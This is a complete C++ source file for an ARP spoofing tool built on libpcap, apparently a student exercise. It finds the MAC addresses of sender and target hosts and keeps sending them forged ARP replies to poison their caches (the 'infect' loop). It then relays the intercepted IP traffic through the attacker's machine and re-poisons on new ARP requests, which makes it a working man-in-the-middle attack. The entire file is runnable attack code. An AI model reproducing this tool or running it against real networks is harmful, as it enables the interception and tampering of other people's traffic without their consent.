#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
using std::thread;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket final {
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// dmac = broadcast, smac = my_mac, sip = my_ip, tip = sender_ip
EthArpPacket make_arp_req(Mac smac, Ip sip, Ip tip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(tip);

    return packet;
}

// dmac,tmac = sender_mac, smac =my_mac, sip=target_ip, tip = sender_ip
EthArpPacket make_arp_rep(Mac dmac, Mac smac, Ip sip, Ip tip){
	EthArpPacket packet;

	packet.eth_.dmac_ = dmac; // you mac
	packet.eth_.smac_ = smac; // me mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = smac; // me mac
	packet.arp_.sip_ = htonl(sip); // gw ip
	packet.arp_.tmac_ = dmac; // you mac
	packet.arp_.tip_ = htonl(tip); // you ip

	return packet;
}

Ip get_my_ip(char* dev){
	struct ifreq s;
  	int fd = socket(PF_INET, SOCK_DGRAM, 0);

	strcpy(s.ifr_ifrn.ifrn_name, dev);
	if (ioctl(fd, SIOCGIFADDR, &s) < -1){
		printf("error = %s\n", strerror(errno));
        close(fd);
        exit(-1);
	}
	// ??
	uint8_t* ip = (uint8_t *)s.ifr_addr.sa_data;
	return Ip((ip[2] << 24) | (ip[3]<< 16) | (ip[4] << 8) | (ip[5]));
}

Mac get_my_mac(char* dev){
	struct ifreq s;
  	int fd = socket(PF_INET, SOCK_DGRAM, 0);

	// get mac
  	strcpy(s.ifr_ifrn.ifrn_name, dev);
	printf("%s\n", s.ifr_ifrn.ifrn_name);
  	if (ioctl(fd, SIOCGIFHWADDR, &s) == -1){
        printf("error = %s\n", strerror(errno));
        close(fd);
        exit(-1);
    }
	return Mac((uint8_t *)s.ifr_hwaddr.sa_data);
}

Mac get_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip){
	EthArpPacket packet = make_arp_req(my_mac, my_ip, sender_ip);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
	}
	// get reply
    while(true){
        struct pcap_pkthdr* header;
		const u_char* reply_packet;
        res = pcap_next_ex(handle, &header, &reply_packet);	
        if (res == 0) 
			continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
		EthArpPacket* arp_packet = (EthArpPacket *)reply_packet;
		if(arp_packet->eth_.type()!=EthHdr::Arp) continue;
		//printf("1\n");
        if(arp_packet->arp_.op()!=ArpHdr::Reply) continue;
		//printf("2\n");
        if(arp_packet->arp_.sip()!=sender_ip) continue;
		//printf("3\n");
        if(arp_packet->arp_.tip()!=my_ip) continue;
		//printf("4\n");

		return arp_packet->arp_.smac_;
    }
}

void infect(pcap_t* handle, int argc, Mac* sender_mac, Ip* sender_ip, Mac my_mac, Ip* target_ip){
	while(1){
		for (int i=1; i<argc/2; i++){
			EthArpPacket packet = make_arp_rep(sender_mac[i-1], my_mac, target_ip[i-1], sender_ip[i-1]);
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			printf("infect!\n");
			sleep(1);
		}
		sleep(5);
	}
	return;
}

int main(int argc, char* argv[]) {
	// maximum 8 attck at the same time
	if (argc < 4 || argc >18 || argc%2 ) {
		usage();
		return -1;
	}

	// open device
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 1000, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// get my(attacker) info
	Ip my_ip = get_my_ip(dev);
	Mac my_mac = get_my_mac(dev);
	printf("attacker_ip: %s\n", std::string(my_ip).c_str());
	printf("attacker_mac: %s\n", std::string(my_mac).c_str());
	// sender info
	Ip sender_ip[8];
	Mac sender_mac[8];

	// target info
	Ip target_ip[8];
	Mac target_mac[8];

	for (int i=1; i<argc/2; i++){
		sender_ip[i-1] = Ip(argv[2*i]);
		sender_mac[i-1] = get_mac(handle, my_mac, my_ip, sender_ip[i-1]);
		target_ip[i-1] = Ip(argv[2*i + 1]);
		target_mac[i-1] = get_mac(handle, my_mac, my_ip, target_ip[i-1]);
		printf("sender_ip: %s\n", std::string(sender_ip[i-1]).c_str());
		printf("sender_mac: %s\n", std::string(sender_mac[i-1]).c_str());
		printf("target_mac: %s\n", std::string(target_mac[i-1]).c_str());
	}

	//infect
	thread t1(infect, handle, argc, sender_mac, sender_ip, my_mac, target_ip);
	
	//receive
	while(1){
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);	
    	if (res == 0) 
			continue;
    	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
       		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(-1);
    	}
		EthHdr *eth_header = (EthHdr*)packet;
		//ip request relay
		if(eth_header->type() == EthHdr::Ip4){
			EthIpPacket* ip_header = (EthIpPacket *)packet;
			uint32_t pktlen = sizeof(struct EthHdr) + ntohs(ip_header->ip_.total_length);
			for (int i=1; i<argc/2; i++){
				if (eth_header->smac() != sender_mac[i-1]) continue;
				if (eth_header->dmac() == Mac::broadcastMac()) continue;
				printf("Ip relay!\n");
				ip_header->eth_.smac_ = my_mac;
				ip_header->eth_.dmac_ = target_mac[i-1];
				int ress = pcap_sendpacket(handle, packet, pktlen);
				if (ress != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
		//arp request
		if(eth_header->type() == EthHdr::Arp){
			bool infection = 0;
			EthArpPacket* arp_packet = (EthArpPacket *)packet;
			if (arp_packet->arp_.op() != ArpHdr::Request) continue;
			for (int i=1; i<argc/2; i++){
				
				if (arp_packet->arp_.smac_ == sender_mac[i-1] && arp_packet->arp_.tip_==target_ip[i-1]) infection = 1;
				if (arp_packet->arp_.smac_ == sender_mac[i-1] && arp_packet->arp_.tmac_ == Mac::broadcastMac()) infection = 1;
				if (arp_packet->arp_.smac_ == target_mac[i-1] && arp_packet->arp_.tmac_ == Mac::broadcastMac()) infection = 1;
				if(infection){
					EthArpPacket infect_packet = make_arp_rep(sender_mac[i-1], my_mac, target_ip[i-1], sender_ip[i-1]);
					int ress = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
					if (ress != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
					printf("Infect again!\n");
				}
			}
		}
	}

	t1.join();
	pcap_close(handle);
}